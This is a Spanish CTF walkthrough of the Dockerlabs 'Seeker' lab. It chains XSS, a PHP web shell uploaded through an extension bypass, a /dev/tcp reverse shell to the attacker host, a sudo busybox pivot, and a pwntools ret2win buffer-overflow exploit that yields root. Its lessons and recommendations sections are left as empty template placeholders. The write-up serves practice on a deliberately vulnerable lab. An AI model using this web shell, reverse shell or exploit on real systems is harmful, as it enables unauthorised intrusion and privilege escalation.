
# Writeup Template: Maquina `[ Seeker ]`

- Tags: #Seeker #bufferOverFlow
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Seeker](https://mega.nz/file/mIkXDDgI#vebCZfiydSu6yFdX_O8qgmiogPeePfB1Uj1v-ZttV1w)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x seeker.zip
sudo bash auto_deploy.sh seeker.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t [IP_TARGET] -p [Rango_Puertos]

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
```
---

## Enumeracion de [Servicio Web Principal]
Revisando el codigo fuente tenemos un subdominio:
```bash
located at /var/www/5eEk3r/index.html
```

Asi que lo agregamos a nuestro archivo **/etc/hosts**
```bash
172.17.0.2 5eEk3r.dl
```

direccion **URL** del servicio:
```bash
http://5eek3r.dl/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2/ # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 5eek3r.dl # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://5eek3r.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada critico

### Descubrimiento de Archivos
```bash
gobuster dir -u http://5eek3r.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,java
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 10705]
/javascript           (Status: 301) [Size: 311] [--> http://5eek3r.dl/javascript/]
```

### Descubrimiento de Subdominios
```bash
wfuzz -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host:FUZZ.5eek3r.dl" -u 172.17.0.2 --hl=10,368
```

- **Hallazgos**:
```bash
000011245:   200        101 L    75 W       932 Ch      "crosswords"
```

Tenemos un nuevo subdominio que agregaremos a nuestro archivo **/etc/hosts**
```bash
172.17.0.2 crosswords.5eek3r.dl
```

Ahora ingresamos a la url:
```bash
http://crosswords.5eek3r.dl/
```

Tenemos una web donde nos permite Codificar una cadena en **cifradoCesar Rot14** Cuando ingresamos una cadena como **hola** en la web nos devuelve esto:
```bash
vczo
```

Para comprobarlo usaremos nuestro script de **python3** que esta orientado para **codificar** y **decodificar** este tipo de cifrado:
MI script en **python3** **cesarCode.py**
```python
#!/usr/bin/env python3
import argparse
from termcolor import colored as c

def get_arguments():
    parser = argparse.ArgumentParser(description="Herramienta para cifrar/descifrar usando Cifrado César")
    parser.add_argument("-t", "--text", required=True, dest="texto", help="Texto a procesar")
    parser.add_argument("-k", "--key", type=int, default=3, help="Clave de desplazamiento (por defecto 3)")
    parser.add_argument("-d", "--descifrar", action="store_true", help="Descifrar en lugar de cifrar")
    
    return parser.parse_args()

def cesar(texto, k, descifrar=False):
    resultado = []
    if descifrar:
        k = -k  # Invertimos el desplazamiento para descifrar
    
    for letra in texto:
        if letra.isalpha():
            base = 'A' if letra.isupper() else 'a'
            nueva_letra = chr((ord(letra) - ord(base) + k) % 26 + ord(base))
            resultado.append(nueva_letra)
        else:
            resultado.append(letra)

    return ''.join(resultado)

def main():
    args = get_arguments()
    
    # Procesar el texto que le pasemos como argumento
    resultado = cesar(
        texto=args.texto,
        k=args.key,
        descifrar=args.descifrar
    )
    
    print(c(f"{resultado}", "cyan"))

if __name__ == '__main__':
    main()
```

Para verificar que es **rot14** el empleado usaremos la siguiente sintaxis para comprobarlo:
```bash
cesarCode.py -t 'hola' -k 14

vczo # Mismo resultado que en la web
```
### XSS `Cross-Site Scripting`
Abriendo las herramientas de desarrollador: **ctrl + shift + c** podemos ver este comentario.
```html
<!-- -- Al que contratamos para crear la web nos habló de algo llamado 'xss'... que será? ---->
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Tenemos una vulnerabilidad de **xss** asi que probaremos como reacciona la web ante inyecciones de etiquetas **javaScript**
```bash
<script>window.alert("Hacked");</script>
```
### Ejecucion del Ataque
Desde **burpsuite** interceptamos la peticion, Despues la mandamos al mod **repeater** y en la peticion inyectamos la siguiente etiquetas:
```bash
inputText=<h1 style="color: red">Hacked</h1>
```

Si miramos la respuesta: tenemos lo siguiente:
```bash
Comando para la explotacion
<div class='previous-text'><v1 ghmzs="qczcf: fsr">Voqysr</v1></div>
```

**Proxy > ProxySettings > Respones Interception Rules > Intercept Responese based on the following rules** Marcamos con palomita esta casilla para poder interceptar la respuesta del servidor:
**Nota Importante** todo esto tiene que ser desde el modo: **Intercept** para que una ves que le demos al boton: **FordWard** logremos capturar la respuesta del servidor y puedamos modificarla:
Ahora una ves que obtengamos la respuesta estara en **rot14** pero lo que haremos es modificarla para que quede de la siguiente manera:
```html
<div class='previous-text'>
	<p style="color:red";>
		hacked
	</p>
</div>
```

Si cuando dejemos pasar la respuesta sale en color **rojo** hemos logrado aconteser un **XSS**
Quitamos el modo **Intercept** para que sea recivida la respuesta del servidor, Logrando con exito un **XSS** Ya que en la respuesta llego de color **rojo** como lo habiamos especificado
Intentando ganar acceso robando la cookie de sesion no obtuvimos exito ya que necesitamos interaccion con el usuario:

Ahora volveremos a **fuzzer** por subdominios:
```bash
wfuzz -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host:FUZZ.crosswords.5eek3r.dl" -u 172.17.0.2 --hl=10,368
```

Tenemos un nuevo subdominio:
```bash
000000259:   200        103 L    189 W      2906 Ch     "admin"
```

Ahora agregamos este nuevo dominio a nuestro archivo: **/etc/hosts**
```bash
172.17.0.2 admin.crosswords.5eek3r.dl
```

Ingresando a la nueva **URL** nos encontramos con un panel administrativo que nos permite la carga de un archivo, Ahora si no valida la subida nos aprovecharemos para subir un archivo malicioso para ganar acceso a la maquina:
```bash
http://admin.crosswords.5eek3r.dl/
```

Crearemos un archivo: **cmd.php** que contendra lo siguiente:
```php
<?php
  system($_GET["cmd"]);
?>
```

Cuando le damos a **subirArchivo** no lo permite, Ya que solo podemos subir archivos **HTML**
Volvemos a interceptar la peticion para intentar un ataque de extensiones para el archivo, Y lograr colarlo al servidor:
[PHP Extensiones](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html?highlight=php%20extension#bypass-file-extensions-checks) De aqui sacareamos las extensiones para realizar el ataque:
Logrando subir un archivo: **php2** pero aun no sabemos donde se esta almacenando:
```bash
Content-Disposition: form-data; name="upload"; filename="cmd.php2"
Content-Type: application/x-php

<?php
  system($_GET["cmd"]);
?>
```

Ahora sabemos que lo sube en esta ruta, Pero tenemos que encontra una extension que si ejecute el codigo:
```bash
http://crosswords.5eek3r.dl/cmd.php2
```

Tenemos el archivo que nos permite ejecutar comandos:
```bash
http://crosswords.5eek3r.dl/cmd.phtml?cmd=whoami
```
### Intrusion
Ahora que podemos ejecutar comandos nos ponemos en escucha
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
http://crosswords.5eek3r.dl/cmd.phtml?cmd=bash%20-c%20%27exec%20bash%20-i%20%26%3E/dev/tcp/172.17.0.1/443%20%3C%261%27
```

---
## Escalada de Privilegios

###### Usuario `[ www-data ]`:
Lisando los permisos para este usuario tenemmos lo siguiente:
```bash
sudo -l

User www-data may run the following commands on dockerlabs:
    (astu : astu) NOPASSWD: /usr/bin/busybox # Binario potencial
```

Sabiendo que solo son dos usuarios del sistema,:
```bash
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
astu:x:1000:1000:astu,,,:/home/astu:/bin/bash
```

Si intentamos ejecutar el bianario tenemos lo siguiente:
```bash
sudo -u astu /usr/bin/busybox 
```

No retorna el modo de uso y los binarios que podemos ejecutar:
```bash
Usage: busybox [function [arguments]...]
   or: busybox --list[-full]
   or: busybox --show SCRIPT
   or: busybox --install [-s] [DIR]
   or: function [arguments]...

 BusyBox is a multi-call binary that combines many common Unix
 utilities into a single executable.  Most people will create a
 link to busybox for each function they wish to use and BusyBox
 will act like whatever it was invoked as.

Currently defined functions:
 [, [[, acpid, adjtimex, ar, arch, arp, arping, ascii, ash, awk, base64, basename, bc, blkdiscard, blkid, blockdev, brctl, bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt, clear, cmp, cp, cpio, crc32, cttyhack, cut, date, dc, dd, deallocvt,
 depmod, devmem, df, diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap, dumpleases, echo, egrep, env, expand, expr, factor, fallocate, false, fatattr, fdisk, fgrep, find, findfs, fold, free, freeramdisk, fsfreeze, fstrim, ftpget, ftpput, getopt, getty,
 grep, groups, gunzip, gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, i2cdetect, i2cdump, i2cget, i2cset, i2ctransfer, id, ifconfig, ifdown, ifup, init, insmod, ionice, ip, ipcalc, ipneigh, kill, killall, klogd, last, less, link, linux32, linux64,
 linuxrc, ln, loadfont, loadkmap, logger, login, logname, logread, losetup, ls, lsmod, lsscsi, lzcat, lzma, lzop, md5sum, mdev, microcom, mim, mkdir, mkdosfs, mke2fs, mkfifo, mknod, mkpasswd, mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
 netstat, nl, nologin, nproc, nsenter, nslookup, nuke, od, openvt, partprobe, paste, patch, pidof, ping, ping6, pivot_root, poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice, reset, resume, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio,
 run-init, run-parts, sed, seq, setkeycodes, setpriv, setsid, sh, sha1sum, sha256sum, sha3sum, sha512sum, shred, shuf, sleep, sort, ssl_client, start-stop-daemon, stat, strings, stty, svc, svok, swapoff, swapon, switch_root, sync, sysctl, syslogd, tac, tail,
 tar, taskset, tee, telnet, test, tftp, time, timeout, top, touch, tr, traceroute, traceroute6, true, truncate, ts, tty, ubirename, udhcpc, udhcpd, uevent, umount, uname, uncompress, unexpand, uniq, unix2dos, unlink, unlzma, unshare, unxz, unzip, uptime, usleep,
 uudecode, uuencode, vconfig, vi, w, watch, watchdog, wc, wget, which, who, whoami, xargs, xxd, xz, xzcat, yes, zcat
```

Migramos al usuario:
```bash
# Comando para escalar al usuario: ( astu )
sudo -u astu /usr/bin/busybox sh
```

###### Usuario `[ astu ]`:
Listando por binarios con permisos **SUID**
```bash
find / -perm -4000 2>/dev/null
```

Tenemos un binario:
```bash
/home/astu/secure/bs64
```

Si ejecutamos el binario tenemos que nos devuelve una cadena en **base64**
```bash
/bs64
Ingrese el texto: hola

aG9YS=
```

Ahora probaremos si es vulnerable **BufferOverFlow** para determinar esto usaremos python3 para crear 200 letras **A**
```bash
python3 -c 'print("A"*200)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Tenemos un **bufferOverFlow**:
```bash
Ingrese el texto: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
QUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQU=

Segmentation fault
```

Ahora desde la maquina victima montamos un servidor **python3** para descargarnos el binario a nuestro equipo de atacante:
```bash
python3 -m http.server 8080
```

Realizamos la peticion:
```bash
wget http://172.17.0.2:8080/bs64
```

Damos permisos de ejecucion a el binario:
```bash
chmod +x bs64
```

# BufferOverFlow

Lanzamos el binario con la herramienta:
```bash
gdb ./bs64
```

Ejecutamos la aplicacion:
```bash
pwndbg> run
```

Ahora crearemos un cadena de **400** caracteres para aplicar el desbordamiento de **buffer**
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

Se ejecutara el programa, Y nos pedira que ingresemos un **texto**
```bash
Ingrese el texto: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

Tenemos lo siguiente:
```bash
Program received signal SIGSEGV, Segmentation fault.
0x00000000004013d8 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]
 RAX  0
 RBX  0x7fffffffdd88 ◂— '4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A'
 RCX  0
 RDX  0
 RDI  0x7ffff7f987b0 (_IO_stdfile_1_lock) ◂— 0
 RSI  0x4052a0 ◂— 0x5751455751455751 ('QWEQWEQW')
 R8   0
 R9   0
 R10  0
 R11  0x202
 R12  0
 R13  0x7fffffffdd98 ◂— 'Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A'
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 ◂— 0
 R15  0x403df0 —▸ 0x401130 ◂— endbr64 
 RBP  0x3363413263413163 ('c1Ac2Ac3')
 RSP  0x7fffffffdc78 ◂— 0x6341356341346341 ('Ac4Ac5Ac')
 RIP  0x4013d8 (main+58) ◂— ret 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────
 ► 0x4013d8 <main+58>    ret                                <0x6341356341346341>
    ↓


──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────
00:0000│ rsp 0x7fffffffdc78 ◂— 0x6341356341346341 ('Ac4Ac5Ac')
01:0008│     0x7fffffffdc80 ◂— 0x4138634137634136 ('6Ac7Ac8A')
02:0010│     0x7fffffffdc88 ◂— 0x3164413064413963 ('c9Ad0Ad1')
03:0018│     0x7fffffffdc90 ◂— 0x6441336441326441 ('Ad2Ad3Ad')
04:0020│     0x7fffffffdc98 ◂— 0x4136644135644134 ('4Ad5Ad6A')
05:0028│     0x7fffffffdca0 ◂— 0x3964413864413764 ('d7Ad8Ad9')
06:0030│     0x7fffffffdca8 ◂— 0x6541316541306541 ('Ae0Ae1Ae')
07:0038│     0x7fffffffdcb0 ◂— 0x4134654133654132 ('2Ae3Ae4A')
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────
 ► 0         0x4013d8 main+58
   1 0x6341356341346341 None
   2 0x4138634137634136 None
   3 0x3164413064413963 None
   4 0x6441336441326441 None
   5 0x4136644135644134 None
   6 0x3964413864413764 None
   7 0x6541316541306541 None
```

Vemos que el **ret** tiene este valor **0x6341356341346341**
```bash
► 0x4013d8 <main+58>    ret                                <0x6341356341346341>
```

Ahora toca sacar el valor de **offset** en dicha direccion: Tenemos que el valor del **offset** es el **72**
```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6341356341346341
[*] Exact match at offset 72
```

La salida de **`checksec`** te da un desglose de las **protecciones de seguridad** que están activas en el binario.
- **File**: Es el **nombre del archivo** binario que estás analizando (`bs64`).
- **Arch**: La **arquitectura** del binario es **amd64** (es decir, 64 bits).

**RELRO** es una protección de seguridad que ayuda a evitar ciertos tipos de ataques, como **la escritura en las direcciones de memoria que deberían ser solo de lectura**.
- **Partial RELRO**: El binario tiene **protección parcial**. Esto significa que se protege solo una parte de las secciones de memoria, pero no todo. No es la forma más segura, pero es algo mejor que no tener RELRO en absoluto. El **Full RELRO** proporciona una protección más fuerte contra ciertos ataques de escritura en memoria.

El **canary** es una técnica que ayuda a prevenir **desbordamientos de buffer** al insertar un valor secreto antes de la dirección de retorno en la pila. Si un atacante intenta sobrescribir la dirección de retorno, el canario cambiará, lo que provoca que el programa termine (o se comporte de manera inesperada).
**No canary found**: **El binario no tiene protección de canario**. Esto hace que sea más vulnerable a ataques de desbordamiento de buffer, ya que no se está protegiendo explícitamente la pila.

**NX (No eXecute)** es una protección que asegura que ciertas áreas de la memoria (como la pila) no se pueden ejecutar como código. Esto evita que los atacantes ejecuten código arbitrario en la pila, como lo harían en un ataque de **buffer overflow**.
- **NX enabled**: **NX está habilitado**, lo que significa que la pila y otras regiones de la memoria no pueden ser ejecutadas, haciendo que ciertos tipos de explotación, como la ejecución de código malicioso desde la pila, sean más difíciles.

**PIE (Position Independent Executable)** es una característica que hace que el binario sea más difícil de predecir. Cuando **PIE está habilitado**, el binario se carga en **direcciones aleatorias de la memoria** cada vez que se ejecuta, lo que hace que la explotación de vulnerabilidades sea más difícil.
- **No PIE**: **No está habilitado PIE**, lo que significa que el binario se carga en una dirección fija (en este caso, `0x400000`). Esto hace que sea más fácil para un atacante predecir la ubicación de funciones y otros componentes importantes en la memoria.

Los **binarios "stripped"** son aquellos a los que se les han eliminado los **símbolos de depuración** (como nombres de funciones y variables). Esto hace que el binario sea más difícil de analizar y explotar porque se pierde información útil.
- **No**: **El binario no está despojado** de símbolos, lo que significa que tiene información de depuración (por ejemplo, nombres de funciones). Esto puede ser útil para la explotación y el análisis.
```bash
pwndbg> checksec # Verificamos las proteciones del binario

File:     /home/kali/Vulnerable_labs/Seeker/content/bs64
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

Ahora lo que procede es lanzar **ghidra** para analizar el binario:
Creamos un nuevo proyecto, le damos en **non-shared** y depues importamos el binario: **bs64** Tenemos la funcion **fire**
```bash
void fire(void)

{
  printf("Ejecutando /bin/sh");
  setuid(0);
  system("/bin/sh");
  return;
}
```

Ahora checamos su direccon de memoria:
```bash
pwndbg> info functions fire
All functions matching regular expression "fire":

Non-debugging symbols:
0x000000000040136a  fire
```

Ahora para ecplotar el binario usaremos el exploit del usuario [dise0](https://dise0.gitbook.io/h4cker_b00k/ctf/dockerlabs/seeker-dockerlabs-intermediate) para ganar acceso como **root**
**exploit.py** lo creamos en el directorio **tmp**
```python
#!/bin/python3

from pwn import *

# Configuración del binario
binary = '/home/astu/secure/bs64'  # Reemplaza con la ruta del binario
context.binary = binary

# Cargar el binario
elf = ELF(binary)
p = process(binary)

# Dirección de la función "fire"
fire_func = 0x40136b  # Dirección de la función fire

# Crear el payload
payload = b"A" * 72  # Relleno hasta el EIP (offset de 72 bytes)
payload += p64(fire_func)  # Dirección de la función "fire"

# Enviar el payload
log.info(f"Enviando payload: {payload}")
p.sendline(payload)

# Mantener la interacción
p.interactive()
```

Le damos permisos de ejecucion:
```bash
chmod +x exploit.py
```

Ejecutamos el **exploit**
```bash
python3 exploit.py
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final

[+] Starting local process '/home/astu/secure/bs64': pid 593
[*] Enviando payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAk\x13@\x00\x00\x00\x00\x00'
[*] Switching to interactive mode
Ingrese el texto: QUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFaxN

$ whoami
root
```

---

## Lecciones Aprendidas
1. [Lección 1]
2. [Lección 2]
3. [Lección 3]

## Recomendaciones de Seguridad
- [Recomendación 1]
- [Recomendación 2]
- [Recomendación 3]